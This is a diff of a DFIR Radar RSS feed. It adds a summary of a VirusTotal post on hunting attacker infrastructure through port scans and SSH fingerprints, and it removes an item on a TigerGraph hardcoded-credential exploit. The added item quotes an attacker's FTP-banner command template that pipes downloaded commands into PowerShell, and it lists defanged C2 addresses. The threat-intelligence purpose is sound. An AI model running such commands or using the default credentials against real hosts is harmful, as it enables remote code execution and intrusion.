@@ -5,8 +5,34 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Thu, 08 Oct 2026 11:02:22 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 08 Oct 2026 12:03:58 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Internet Scanning in VirusTotal: hunting infrastructure by what it exposes</title>
+      <link>https://blog.virustotal.com/2026/10/internet-scanning-in-vt.html</link>
+      <description>VirusTotal now scans the full public IPv4 space daily, storing open/closed ports, banners, fingerprints, and service versions for every IP, and makes it all searchable. This changes infrastructure hunting from reputation lookups to active fingerprinting at scale.
+
+Key findings:
+
+- Every IP report now carries a Ports tab with port status (open, closed, recently closed), first/last seen dates, service product and version, CPEs, raw banners, SSH host key fingerprints, RDP fingerprints, OS/device type, and protocol-level detail (HTTP headers, SMTP caps, etc.). Critically, closed ports are preserved with their last-seen date, answering "when did this C2 go dark?" long after the fact. The bracket syntax pins conditions to a specific port so queries like entity:ip port_service_product[8443]:nginx port_service_cpe[8443]:php os_type[445]:10.0.20348 open_port:445 open_port:3389 are precise: that query cuts 4.5 million IPs with port 8443 open down to 10 globally, and one of those 10 is the NOX Stealer / BOMBAY Stealer operator panel on 5.175.221[.]206.
+
+- The SSH fingerprint pivot is the sharpest technique shown. Starting from 91.219.237[.]110, flagged in an APT28 collection and a Havoc C2 community collection, searching entity:ip fingerprint:"SHA256:SbF6+nFx6ngfUw2L+jsqN6uu5tdsFc5jUW849WA/Sxw" returns one sibling: 185.146.232[.]3 on FlokiNET, zero detections, no collections. The two share the same OpenSSH build, nginx 1.24.0 on port 80, and JARM. Pivoting further on ssl_subject:"b4ck[.]my" surfaces a third node, 96.9.125[.]59, with ports 22 and 80 now closed, last seen active days before 185.146.232[.]3 came online. The port timeline captures a node rotation the reputation score never would.
+
+- The FTP-banner-as-dead-drop technique, previously documented by SOCRadar for the E4del and PINHOLE RAT clusters, is directly huntable with entity:ip port_banner[21]:"conhost". At time of writing the query returns five IPs all serving the same template: start "" conhost.exe --headless cmd /c "ftp [next-hop]|powershell". The chain 157.254.194[.]31 pointing to 167.148.41[.]164 matches the E4del chain exactly. Port 21 on the first hop was open 2026-07-11 through 2026-08-10; the same host now exposes nginx on port 8000 and Python SimpleHTTP on port 8080. The IP 54.37.237[.]164 was still serving the banner as of 2026-10-01.
+
+- The NOX/BOMBAY Stealer case shows the rebranding trap. The panel on 5.175.221[.]206:8443 rebranded in place: the raw HTTP response shrank to a 193-byte noindex stub to defeat static title queries, but full-browser DOM capture caught the new title BOMBAY STEALER - Login. The MD5-prefixed routes rotated (/29f69693228c27033209532b5a6a97d1/... to /3a85f1d2131fa2723ac6ade171eafacd/dashboard), but the host fingerprint never changed: nginx 1.24.0 and PHP/8.3.33 on 8443, Windows Server 2022 (10.0.20348) on 445, RDP on 3389, NetBIOS name WIN-BM6C4ESB87V. The sibling panels hide behind Cloudflare on grabber[.]cy and lumma[.]cy; the operator panel exposed directly on the raw IP was the only pivot point.
+
+Practitioner takeaway: open port is a weak signal, fingerprint plus service stack is a strong one. Start hunts with bracket-syntax queries that pin every condition to its port. For the FTP dead-drop technique, run entity:ip port_banner[21]:"conhost" and check the /24 of any hit for the second-hop server. For SSH pivoting, check fingerprint hit counts first: shared keys on more than a few IPs usually mean a VPS image or router firmware default, not an operator cluster. The API now exposes port_info on the standard IP endpoint and three new port-specific endpoints (/api/v3/port_infos/{ip}:{port}, /api/v3/port_infos/{ip}:{port}/analysis, /api/v3/port_analyses/{ip}:{port}:{timestamp}). Livehunt YARA does not yet expose port data in the vt[.]net.ip fields; schedule API re-runs as the workaround.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2108166506932498768</description>
+      <content:encoded><![CDATA[<p>VirusTotal now scans the full public IPv4 space daily, storing open/closed ports, banners, fingerprints, and service versions for every IP, and makes it all searchable. This changes infrastructure hunting from reputation lookups to active fingerprinting at scale.</p><p>Key findings:</p><p>- Every IP report now carries a Ports tab with port status (open, closed, recently closed), first/last seen dates, service product and version, CPEs, raw banners, SSH host key fingerprints, RDP fingerprints, OS/device type, and protocol-level detail (HTTP headers, SMTP caps, etc.). Critically, closed ports are preserved with their last-seen date, answering &quot;when did this C2 go dark?&quot; long after the fact. The bracket syntax pins conditions to a specific port so queries like entity:ip port_service_product[8443]:nginx port_service_cpe[8443]:php os_type[445]:10.0.20348 open_port:445 open_port:3389 are precise: that query cuts 4.5 million IPs with port 8443 open down to 10 globally, and one of those 10 is the NOX Stealer / BOMBAY Stealer operator panel on 5.175.221[.]206.</p><p>- The SSH fingerprint pivot is the sharpest technique shown. Starting from 91.219.237[.]110, flagged in an APT28 collection and a Havoc C2 community collection, searching entity:ip fingerprint:&quot;SHA256:SbF6+nFx6ngfUw2L+jsqN6uu5tdsFc5jUW849WA/Sxw&quot; returns one sibling: 185.146.232[.]3 on FlokiNET, zero detections, no collections. The two share the same OpenSSH build, nginx 1.24.0 on port 80, and JARM. Pivoting further on ssl_subject:&quot;b4ck[.]my&quot; surfaces a third node, 96.9.125[.]59, with ports 22 and 80 now closed, last seen active days before 185.146.232[.]3 came online. The port timeline captures a node rotation the reputation score never would.</p><p>- The FTP-banner-as-dead-drop technique, previously documented by SOCRadar for the E4del and PINHOLE RAT clusters, is directly huntable with entity:ip port_banner[21]:&quot;conhost&quot;. At time of writing the query returns five IPs all serving the same template: start &quot;&quot; conhost.exe --headless cmd /c &quot;ftp [next-hop]|powershell&quot;. The chain 157.254.194[.]31 pointing to 167.148.41[.]164 matches the E4del chain exactly. Port 21 on the first hop was open 2026-07-11 through 2026-08-10; the same host now exposes nginx on port 8000 and Python SimpleHTTP on port 8080. The IP 54.37.237[.]164 was still serving the banner as of 2026-10-01.</p><p>- The NOX/BOMBAY Stealer case shows the rebranding trap. The panel on 5.175.221[.]206:8443 rebranded in place: the raw HTTP response shrank to a 193-byte noindex stub to defeat static title queries, but full-browser DOM capture caught the new title BOMBAY STEALER - Login. The MD5-prefixed routes rotated (/29f69693228c27033209532b5a6a97d1/... to /3a85f1d2131fa2723ac6ade171eafacd/dashboard), but the host fingerprint never changed: nginx 1.24.0 and PHP/8.3.33 on 8443, Windows Server 2022 (10.0.20348) on 445, RDP on 3389, NetBIOS name WIN-BM6C4ESB87V. The sibling panels hide behind Cloudflare on grabber[.]cy and lumma[.]cy; the operator panel exposed directly on the raw IP was the only pivot point.</p><p>Practitioner takeaway: open port is a weak signal, fingerprint plus service stack is a strong one. Start hunts with bracket-syntax queries that pin every condition to its port. For the FTP dead-drop technique, run entity:ip port_banner[21]:&quot;conhost&quot; and check the /24 of any hit for the second-hop server. For SSH pivoting, check fingerprint hit counts first: shared keys on more than a few IPs usually mean a VPS image or router firmware default, not an operator cluster. The API now exposes port_info on the standard IP endpoint and three new port-specific endpoints (/api/v3/port_infos/{ip}:{port}, /api/v3/port_infos/{ip}:{port}/analysis, /api/v3/port_analyses/{ip}:{port}:{timestamp}). Livehunt YARA does not yet expose port data in the vt[.]net.ip fields; schedule API re-runs as the workaround.</p><p>#DFIR_Radar</p><p><a href="https://blog.virustotal.com/2026/10/internet-scanning-in-vt.html">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2108166506932498768">View on X</a></p>]]></content:encoded>
+      <dc:creator>VirusTotal Blog</dc:creator>
+      <comments>https://x.com/DFIR_Radar/status/2108166506932498768</comments>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2108166506932498768">DFIR Radar</source>
+      <pubDate>Thu, 08 Oct 2026 12:03:58 +0000</pubDate>
+      <guid isPermaLink="false">2108166506932498768</guid>
+    </item>
     <item>
       <title>UAT-11985: AI-assisted event lures delivering real-time Google AitM phishing</title>
       <link>https://blog.talosintelligence.com/uat-11985/</link>
@@ -2148,20 +2174,6 @@ Hunt priority: search endpoints running TOTVS, SAP, Senior, or Tasy for processe
       <source url="https://x.com/DFIR_Radar/status/2105916475332804631">DFIR Radar</source>
       <pubDate>Fri, 02 Oct 2026 07:03:09 +0000</pubDate>
       <guid isPermaLink="false">2105916475332804631</guid>
-    </item>
-    <item>
-      <title>[webapps] TigerGraph_Community_Edition 4.2.4 - arbitrary file write</title>
-      <link>https://www.exploit-db.com/exploits/52691</link>
-      <description>TigerGraph Community Edition 4.2.4 chains hardcoded tigergraph:tigergraph credentials with unauthenticated REST++ file-write to plant SSH keys for RCE. Audit /home/tigergraph/.ssh/authorized_keys and check port 9000 for unauthenticated queries.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2105901324764323854</description>
-      <content:encoded><![CDATA[<p>TigerGraph Community Edition 4.2.4 chains hardcoded tigergraph:tigergraph credentials with unauthenticated REST++ file-write to plant SSH keys for RCE. Audit /home/tigergraph/.ssh/authorized_keys and check port 9000 for unauthenticated queries.</p><p>#DFIR_Radar</p><p><a href="https://www.exploit-db.com/exploits/52691">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2105901324764323854">View on X</a></p>]]></content:encoded>
-      <dc:creator>Exploit-DB</dc:creator>
-      <comments>https://x.com/DFIR_Radar/status/2105901324764323854</comments>
-      <category>VULNERABILITY</category>
-      <source url="https://x.com/DFIR_Radar/status/2105901324764323854">DFIR Radar</source>
-      <pubDate>Fri, 02 Oct 2026 06:02:56 +0000</pubDate>
-      <guid isPermaLink="false">2105901324764323854</guid>
     </item>
   </channel>
 </rss>
